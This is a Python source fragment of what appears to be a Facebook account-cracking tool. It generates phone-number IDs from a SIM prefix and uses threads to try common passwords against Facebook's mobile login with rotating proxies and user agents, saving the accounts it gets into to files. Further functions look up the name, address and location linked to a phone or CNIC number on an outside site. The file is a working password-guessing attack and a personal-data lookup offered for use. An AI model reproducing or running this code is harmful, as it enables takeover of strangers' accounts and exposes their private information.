	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru]
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()

#___
def bd2():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode,'free fire','bangladish','freefire']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()
#___
def bd3():
	uid=[]
	os.system('clear')
	print(logo)
	print('[√] EXAMPLE : 88***,88***,88***,.ETC')
	linex()
	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	print(' Example : 1000,5000,10000,****Etc')
	limit = int(input('[+] Putt Ypur Idz lemit :  '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		uid.append(nmp)
	with ThreadPool(max_workers=35) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Selected Code : \x1b[1;92m'+kode)
		print('\x1b[1;91m If you no result use flight mode')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode,'puja12','islam12345','islam1122']
			yaari.submit(fcrack,uid,pwx,tl)
	linex()
	print('[✓] Crack process has been completed')
	print('[?] Idz saved in [ok.txt,cp.txt]')
	linex()
	input('Press Enter To Go Back To Menu')
	menu()
#___
def chos():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print('\x1b[1;91m[+] See Not : Use Your Sim Code ')
    linex()
    code = input(' Your Code : ')
    linex()
    os.system('clear')
    print(logo)
    print('[+] Example : 1000,5000,10000,****Etc')
    linex()
    limit = int(input('[+] Idz lemit :  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    print('[+] Example :  1,2,3,4,5,6,7,8,9**,Etc')
    linex()
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    os.system('clear')
    print(logo)
    print('[+] Example : khan12345,bangladish,baloch,***Etc')
    linex()
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\x1b[1;92m '+code)
        print('\x1b[1;91m If you no result use flight mode')
        linex()
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
            manshera.submit(fcrack,uid,pwx,tl)
    linex()
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    linex()

#_

def fcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global ugen
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mZESHAN\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
			sys.stdout.flush()
			ua = random.choice(ugen)
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			pro = random.choice(S2()) 
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'm.alpha.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'dpr': '3',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"CPH1823"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,'viewport-width': '980',}
			lo = session.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\033[1;92m[ZESHAN-OK] '+cid+' | '+ps+'\033[1;32m')
				open('ZESHAN-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[ZESHAN-CP] '+cid+' | '+ps+'\33[0;97m')
				open('ZESHAN-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass
#
try:
    import os,requests,re
    from bs4 import BeautifulSoup
    from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
    print('\n installing modules ...')
    os.system('pip install requests bs4 > /dev/null')
def main():
        os.system("clear")
        print(logo)
        linex()
        print('[1] Get any number data')
        print('[2] Get CNIC number data')
        print('[3] Go to main menu')
        linex()
        xd = input(' Choose : ')
        if xd =='1':
            zong()
        elif xd =='2':
            cinc()
        elif xd =='3':
            rifat()
        else:
            exit(' Option Not in menu ')
def cinc():
    os.system('clear')
    print(logo)
    print(' example : 157022100****,1347583***,Etc')
    linex()
    nmbr = input(f" Put Cinc Number :\033[1;32m ")
    linex()
    head = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-M105F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.58 Mobile Safari/537.36', 'Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'cnnum': nmbr}
    url = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=data)
    dta = re.findall("\<div(.*?)</table>",str(url.text))
    open(".tt1.txt","w").write(str(dta))
    ndt = open(".tt1.txt","r").read()
    ndt = ndt.replace("</strong>","<strong>")
    ndt = ndt.split("<strong>")
    try:
        lines()
        try:print(f" \033[1;37mCinc Num   : \033[1;31m{ndt[5]}")
        except:pass
        try:print(f"\033[1;37m IP Addres  : \033[1;37m{ndt[3].lower()}")
        except:pass
        try:print(f'\033[1;37m City Name  : \033[1;37m{ndt[27]}')
        except:pass
        try:print(f"\033[1;37m Address 1  : \033[1;37m{ndt[9].lower()}")
        except:pass
        try:print(f"\033[1;37m Details 2  : \033[1;37m{ndt[23].lower()}")
        except:pass
        try:print(f"\033[1;37m Details 3  : \033[1;37m{ndt[25].lower()}")
        except:pass
        try:print(f"\033[1;37m Details 4 : \033[1;37m{ndt[43].lower()}")
        except:pass
        try:print(f"\033[1;37m Details 5  : \033[1;37m{ndt[1]}")
        except:pass
        try:print(f"\033[1;37m Details 6  : \033[1;37m{ndt[11]}")
        except:pass
        try:print(f"\033[1;37m Details 7  : \033[1;37m{ndt[29]}")
        except:pass
        try:print(f"\033[1;37m Details 8  : \033[1;37m{ndt[37]}")
        except:pass
        linex()
    except:
        print(' Sorry Data not Found ')
    input('\033[1;91m Go to main menu :')
    linex()
    exit()

def zong():
    os.system('clear')
    print(logo)
    print(' Example : 03*********,030******,Etc')
    linex()
    num = input(f" Put number :\033[1;32m ")
    if num[0] == '0':
        nmbr = num.replace("03","3")
    else:
        nmbr = num
    head = {'User-Agent': 'FBAN/FB4A;FBAV/326.0.0.8.149;FBBV/63922513;FBDM/{density=1.0,width=1280,height=1920};FBLC/en_GB;FBCR/Cellcom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9500;FBSV/11.5.3;FBOP/1;FBCA/armeabi-v7a:armeabi', 'Accept-Encoding': 'gzip, deflate','Connection': 'keep-alive', 'Content-Length': '16', 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'cnnum': nmbr}
    url = requests.post('https://freepicccs.com/search-result2.php',headers=head,data=data)
    dta = re.findall("\<div(.*?)</table>",str(url.text))
    open(".tt1.txt","w").write(str(dta))
    ndt = open(".tt1.txt","r").read()
    ndt = ndt.replace("</strong>","<strong>")
    ndt = ndt.split("<strong>")
    try:
        linex()
        try:print(f" \033[1;37mMobile num : \033[1;37m{ndt[1]}")
        except:pass
        try:print(f"\033[1;37m Name       : \033[1;37m{ndt[5].lower()}")
        except:pass
        try:print(f"\033[1;37m Location   : \033[1;37m{ndt[9].lower()}")
        except:pass
        try:print(f"\033[1;37m Cnic Num   : \033[1;37m{ndt[7]}")
        except:pass
        linex()
    except:
        print(' Sorry Data not Found ')
    input('\033[1;91m Go to main menu :')
    linex()
    exit()
    
menu()